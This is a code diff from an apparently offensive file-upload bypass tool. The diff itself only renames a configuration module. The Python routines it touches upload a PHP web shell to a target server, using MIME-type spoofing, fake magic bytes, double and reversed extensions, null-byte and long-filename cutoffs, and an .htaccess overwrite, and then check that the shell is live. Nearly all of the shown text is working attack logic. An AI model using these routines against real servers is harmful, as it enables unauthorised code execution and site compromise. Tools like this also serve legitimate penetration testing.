@@ -1,5 +1,5 @@
 from filepwner import parse_request_file, upload, info, warning, debug, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate, set_progress_bar, capitalise_random, generate_random_string
-import variations
+import config
 import time
 import random
 
@@ -10,12 +10,12 @@ def mimetype_spoofing(request_file, session, options, accepted_extensions):
     print()
 
     
-    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*2)
+    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*2)
     
-    for php_extension in variations.extensions["php"]:
+    for php_extension in config.extensions["php"]:
         for extension in accepted_extensions:
-            mimetype = variations.mimetypes[extension]
-            with open(variations.shell_path, 'rb') as file: file_data = file.read()
+            mimetype = config.mimetypes[extension]
+            with open(config.shell_path, 'rb') as file: file_data = file.read()
 
             file_extension = f".{php_extension}"
             file_name = generate_random_string(10) + file_extension
@@ -23,7 +23,7 @@ def mimetype_spoofing(request_file, session, options, accepted_extensions):
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype, message)
 
             #with magic bytes
-            file_data = variations.magic_bytes[extension] + file_data
+            file_data = config.magic_bytes[extension] + file_data
             message = f"{file_name}, {mimetype}, magic bytes: ON"
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype, message)
     
@@ -35,13 +35,13 @@ def double_extension(request_file, session, options, accepted_extensions):
 
     content, headers, host, path = parse_request_file(request_file)
     
-    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*3)
+    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*3)
 
-    for php_extension in variations.extensions["php"]:
+    for php_extension in config.extensions["php"]:
         for extension in accepted_extensions:
-            mimetype_php = variations.mimetypes["php"]
-            mimetype_original = variations.mimetypes[extension]
-            with open(variations.shell_path, 'rb') as file: file_data = file.read()
+            mimetype_php = config.mimetypes["php"]
+            mimetype_original = config.mimetypes[extension]
+            with open(config.shell_path, 'rb') as file: file_data = file.read()
 
             #with php mimetype
             file_extension = f".{extension}.{php_extension}"
@@ -54,7 +54,7 @@ def double_extension(request_file, session, options, accepted_extensions):
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)
 
             #with magic bytes and original mimetype
-            file_data = variations.magic_bytes[extension] + file_data
+            file_data = config.magic_bytes[extension] + file_data
             message = f"{file_name}, {mimetype_original}, magic bytes: ON"
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)
 
@@ -65,16 +65,16 @@ def double_extension_random_case(request_file, session, options, accepted_extens
 
     content, headers, host, path = parse_request_file(request_file)
     
-    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*3)
+    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*3)
 
-    for php_extension in variations.extensions["php"]:
+    for php_extension in config.extensions["php"]:
         #capitalising random letters
         php_extension = capitalise_random(php_extension)
 
         for extension in accepted_extensions:
-            mimetype_php = variations.mimetypes["php"]
-            mimetype_original = variations.mimetypes[extension]
-            with open(variations.shell_path, 'rb') as file: file_data = file.read()
+            mimetype_php = config.mimetypes["php"]
+            mimetype_original = config.mimetypes[extension]
+            with open(config.shell_path, 'rb') as file: file_data = file.read()
 
             #with php mimetype
             file_extension = f".{extension}.{php_extension}"
@@ -87,7 +87,7 @@ def double_extension_random_case(request_file, session, options, accepted_extens
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)
 
             #with magic bytes and original mimetype
-            file_data = variations.magic_bytes[extension] + file_data
+            file_data = config.magic_bytes[extension] + file_data
             message = f"{file_name}, {mimetype_original}, magic bytes: ON"
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)
 
@@ -100,13 +100,13 @@ def reverse_double_extension(request_file, session, options, accepted_extensions
 
     content, headers, host, path = parse_request_file(request_file)
     
-    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*3)
+    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*3)
     
-    for php_extension in variations.extensions["php"]:
+    for php_extension in config.extensions["php"]:
         for extension in accepted_extensions:
-            mimetype_php = variations.mimetypes["php"]
-            mimetype_original = variations.mimetypes[extension]
-            with open(variations.shell_path, 'rb') as file: file_data = file.read()
+            mimetype_php = config.mimetypes["php"]
+            mimetype_original = config.mimetypes[extension]
+            with open(config.shell_path, 'rb') as file: file_data = file.read()
 
             #with php mimetype
             file_extension = f".{php_extension}.{extension}"
@@ -119,7 +119,7 @@ def reverse_double_extension(request_file, session, options, accepted_extensions
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False)
 
             #with magic bytes and original mimetype
-            file_data = variations.magic_bytes[extension] + file_data
+            file_data = config.magic_bytes[extension] + file_data
             message = f"{file_name}, {mimetype_original}, magic bytes: ON"
             session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False)
 
@@ -129,18 +129,18 @@ def null_byte_cutoff(request_file, session, options, accepted_extensions):
     print()
 
     #Too many iterations otherwise
-    shortened_php_extension_list = variations.extensions["php"][:4]
+    shortened_php_extension_list = config.extensions["php"][:4]
 
     content, headers, host, path = parse_request_file(request_file)
     
-    set_progress_bar(len(shortened_php_extension_list)*len(accepted_extensions)*len(variations.null_bytes)*3)
+    set_progress_bar(len(shortened_php_extension_list)*len(accepted_extensions)*len(config.null_bytes)*3)
     
     for php_extension in shortened_php_extension_list:
         for extension in accepted_extensions:
-            for null_byte in variations.null_bytes:
-                mimetype_php = variations.mimetypes["php"]
-                mimetype_original = variations.mimetypes[extension]
-                with open(variations.shell_path, 'rb') as file: file_data = file.read()
+            for null_byte in config.null_bytes:
+                mimetype_php = config.mimetypes["php"]
+                mimetype_original = config.mimetypes[extension]
+                with open(config.shell_path, 'rb') as file: file_data = file.read()
 
                 #with php mimetype
                 file_extension = f".{php_extension}{null_byte}.{extension}"
@@ -153,7 +153,7 @@ def null_byte_cutoff(request_file, session, options, accepted_extensions):
                 session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")
 
                 #with magic bytes and original mimetype
-                file_data = variations.magic_bytes[extension] + file_data
+                file_data = config.magic_bytes[extension] + file_data
                 message = f"{file_name}, {mimetype_original}, magic bytes: ON"
                 session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")
 
@@ -166,14 +166,14 @@ def name_overflow_cutoff(request_file, session, options, accepted_extensions):
 
     content, headers, host, path = parse_request_file(request_file)
     
-    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*len(overflow_lengths)*3)
+    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*len(overflow_lengths)*3)
     
-    for php_extension in variations.extensions["php"]:
+    for php_extension in config.extensions["php"]:
         for extension in accepted_extensions:
             for overflow_length in overflow_lengths:
-                mimetype_php = variations.mimetypes["php"]
-                mimetype_original = variations.mimetypes[extension]
-                with open(variations.shell_path, 'rb') as file: file_data = file.read()
+                mimetype_php = config.mimetypes["php"]
+                mimetype_original = config.mimetypes[extension]
+                with open(config.shell_path, 'rb') as file: file_data = file.read()
 
                 #with php mimetype
                 file_extension = f".{php_extension}.{extension}"
@@ -186,7 +186,7 @@ def name_overflow_cutoff(request_file, session, options, accepted_extensions):
                 session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")
 
                 #with magic bytes and original mimetype
-                file_data = variations.magic_bytes[extension] + file_data
+                file_data = config.magic_bytes[extension] + file_data
                 message = f"{file_name}, {mimetype_original}, magic bytes: ON"
                 session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")
 
@@ -198,8 +198,8 @@ def htaccess_overwrite(request_file, session, options, accepted_extensions):
     set_progress_bar(len(accepted_extensions)*2)
     
     for extension in accepted_extensions:
-        mimetype = variations.mimetypes[extension]
-        with open(variations.shell_path, 'rb') as file: php_file_data = file.read()
+        mimetype = config.mimetypes[extension]
+        with open(config.shell_path, 'rb') as file: php_file_data = file.read()
         with open("assets/sample_files/.htaccess", 'rb') as file: file_data = file.read()
 
         php_file_extension = f".arbext"
@@ -218,7 +218,7 @@ def htaccess_overwrite(request_file, session, options, accepted_extensions):
             continue
 
         content, headers, host, path = parse_request_file(request_file)
-        upload_url = f"{variations.protocol}://{host}{options.upload_dir}"
+        upload_url = f"{config.protocol}://{host}{options.upload_dir}"
 
         check_result = check_shell(upload_url + php_file_name, more_info=True)
         if (check_result == True):
